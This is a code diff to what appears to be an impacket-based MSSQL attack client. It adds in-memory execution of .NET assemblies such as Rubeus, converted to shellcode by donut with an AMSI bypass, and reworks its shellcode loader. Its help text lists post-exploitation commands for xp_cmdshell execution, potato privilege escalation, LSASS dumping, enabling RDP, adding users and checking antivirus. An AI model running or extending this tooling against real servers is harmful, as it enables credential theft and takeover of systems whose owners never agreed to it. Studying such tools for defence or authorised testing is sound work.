@@ -25,7 +25,11 @@ import os
 import logging
 import random
 import string
-
+import platform
+try:
+    import donut
+except:
+    pass
 from impacket.examples import logger
 from impacket.examples.utils import parse_target
 from impacket import version
@@ -48,55 +52,55 @@ if __name__ == '__main__':
 
         def do_help(self, line):
             print("""
-    lcd {path}                 - changes the current local directory to {path}
-    exit                       - terminates the server process (and this session)
-    enable_xp_cmdshell         - you know what it means
-    disable_xp_cmdshell        - you know what it means
-    xp_cmdshell {cmd}          - executes cmd using xp_cmdshell
-    sp_oacreate {cmd}          - executes cmd using sp_oacreate
-    xp_dirtree {path}          - executes xp_dirtree on the path
-    sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
-    enable_ole                 - you know what it means
-    disable_ole                - you know what it means
-    upload {local} {remote}    - upload a local file to a remote path (OLE required)
-    download {remote} {local}  - download a remote file to a local path (OLE required)
-    enable_clr                 - you know what it means
-    disable_clr                - you know what it means
-    install_clr                - create assembly and procedure
-    uninstall_clr              - drop clr
-    clr_pwd                    - print current directory by clr
-    clr_ls {directory}         - list files by clr
-    clr_cd {directory}         - change directory by clr
-    clr_ps                     - list process by clr
-    clr_netstat                - netstat by clr
-    clr_ping {host}            - ping by clr
-    clr_cat {file}             - view file contents by clr
-    clr_rm {file}              - delete file by clr
-    clr_exec {cmd}             - for example: clr_exec whoami;clr_exec -p c:\a.exe;clr_exec -p c:\cmd.exe -a /c whoami
-    clr_efspotato {cmd}        - exec by EfsPotato like clr_exec
-    clr_badpotato {cmd}        - exec by BadPotato like clr_exec
-    clr_godpotato {cmd}        - exec by GodPotato like clr_exec
-    clr_combine {remotefile}   - When the upload module cannot call CMD to perform copy to merge files
-    clr_dumplsass {path}       - dumplsass by clr
-    clr_rdp                    - check RDP port and Enable RDP
-    clr_getav                  - get anti-virus software on this machin by clr
-    clr_adduser {user} {pass}  - add user by clr
-    clr_download {url} {path}  - download file from url by clr
-    clr_scloader {code} {key}  - encrypt Shellcode by Encrypt.py (only supports x64 shellcode.bin)
-    clr_scloader1 {file} {key} - encrypt Shellcode by Encrypt.py and Upload Payload.txt
-    clr_scloader2 {remotefile} - upload Payload.bin to target before Shellcode Loader
-    use_link {link}            - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
-    enum_db                    - enum databases
-    enum_links                 - enum linked servers
-    enum_impersonate           - check logins that can be impersonate
-    enum_logins                - enum login users
-    enum_users                 - enum current db users
-    enum_owner                 - enum db owner
-    exec_as_user {user}        - impersonate with execute as user
-    exec_as_login {login}      - impersonate with execute as login
-    ! {cmd}                    - executes a local shell cmd
-    show_query                 - show query
-    mask_query                 - mask query
+    lcd {path}                    - changes the current local directory to {path}
+    exit                          - terminates the server process (and this session)
+    enable_xp_cmdshell            - you know what it means
+    disable_xp_cmdshell           - you know what it means
+    xp_cmdshell {cmd}             - executes cmd using xp_cmdshell
+    sp_oacreate {cmd}             - executes cmd using sp_oacreate
+    xp_dirtree {path}             - executes xp_dirtree on the path
+    sp_start_job {cmd}            - executes cmd using the sql server agent (blind)
+    enable_ole                    - you know what it means
+    disable_ole                   - you know what it means
+    upload {local} {remote}       - upload a local file to a remote path (OLE required)
+    download {remote} {local}     - download a remote file to a local path (OLE required)
+    enable_clr                    - you know what it means
+    disable_clr                   - you know what it means
+    install_clr                   - create assembly and procedure
+    uninstall_clr                 - drop clr
+    clr_pwd                       - print current directory by clr
+    clr_ls {directory}            - list files by clr
+    clr_cd {directory}            - change directory by clr
+    clr_ps                        - list process by clr
+    clr_netstat                   - netstat by clr
+    clr_ping {host}               - ping by clr
+    clr_cat {file}                - view file contents by clr
+    clr_rm {file}                 - delete file by clr
+    clr_exec {cmd}                - for example: clr_exec whoami;clr_exec -p c:\a.exe;clr_exec -p c:\cmd.exe -a /c whoami
+    clr_efspotato {cmd}           - exec by EfsPotato like clr_exec
+    clr_badpotato {cmd}           - exec by BadPotato like clr_exec
+    clr_godpotato {cmd}           - exec by GodPotato like clr_exec
+    clr_combine {remotefile}      - When the upload module cannot call CMD to perform copy to merge files
+    clr_dumplsass {path}          - dumplsass by clr
+    clr_rdp                       - check RDP port and Enable RDP
+    clr_getav                     - get anti-virus software on this machin by clr
+    clr_adduser {user} {pass}     - add user by clr
+    clr_download {url} {path}     - download file from url by clr
+    clr_scloader {shellcode}      - shellcode.bin
+    clr_assembly {prog} {args}    - execute-assembly.   
+    clr_assembly_sc {shellcode}   - assembly shellcode created by donut.   
+    use_link {link}               - linked server to use (set use_link localhost to go back to local or use_link .. to get back one step)
+    enum_db                       - enum databases
+    enum_links                    - enum linked servers
+    enum_impersonate              - check logins that can be impersonate
+    enum_logins                   - enum login users
+    enum_users                    - enum current db users
+    enum_owner                    - enum db owner
+    exec_as_user {user}           - impersonate with execute as user
+    exec_as_login {login}         - impersonate with execute as login
+    ! {cmd}                       - executes a local shell cmd
+    show_query                    - show query
+    mask_query                    - mask query
      """)
 
         def postcmd(self, stop, line):
@@ -131,13 +135,35 @@ if __name__ == '__main__':
             remote, local = input
             self.sql_op.file_doanload(remote, local)
 
-        # def do_clr_assembly(self, line):
-        #     input = line.split(" ")
-        #     if len(input) < 1 or len(line) == 0 :
-        #         print("Example: clr_assembly /tmp/Rubeus.exe -h")
-        #         return
-        #     # TODO
-        #     # self.sql_op.execute_assembly(input)
+        def do_clr_assembly_sc(self, line):
+            input = line.split(" ")
+            if len(input) !=1 or len(line) == 0 :
+                logging.info("Example: clr_assembly_sc shellcode.bin")
+                logging.info("""GenShellcode: docker run -it --rm -v "${PWD}:/workdir" donut -i/workdir/Rubeus.exe -p'-h'""")
+                return
+            self.sql_op.execute_assembly("clr_assembly", line, type='file')
+
+        def do_clr_assembly(self, line):
+            if platform.system().lower() != "linux":
+                logging.warning("Cannot use this function in {}, use clr_assembly_sc instead.".format(platform.system().lower()))
+                return
+            
+            input = line.split(" ")
+            if len(input) < 1 or len(line) == 0 :
+                logging.warning("Example: clr_assembly /tmp/Rubeus.exe hash /password:X")
+                return
+            if len(input) == 1:
+                prog = input[0]
+                args = ""
+            else:
+                prog = input[0]
+                args = " ".join(input[1:])
+            try:
+                shellcode = donut.create(file=prog, params=args, bypass=3)
+            except Exception as e:
+                logging.error("Gen shellcode error.")
+                logging.error(e)
+            self.sql_op.execute_assembly("clr_assembly", shellcode, type='code')
 
         def do_install_clr(self, line):
             self.sql_op.install_clr()
@@ -194,14 +220,7 @@ if __name__ == '__main__':
             self.sql_op.clr_exec("clr_godpotato "+ line) 
 
         def do_clr_scloader(self, line):
-            self.sql_op.clr_exec("clr_scloader "+ line)    
-
-        def do_clr_scloader1(self, line):
-            self.sql_op.clr_exec("clr_scloader1 "+ line)    
-        
-
-        def do_clr_scloader2(self, line):
-            self.sql_op.clr_exec("clr_scloader2 "+ line)    
+            self.sql_op.execute_shellcode("clr_scloader", line)
         
         def do_clr_download(self, line):
             self.sql_op.clr_exec("clr_download "+ line)    
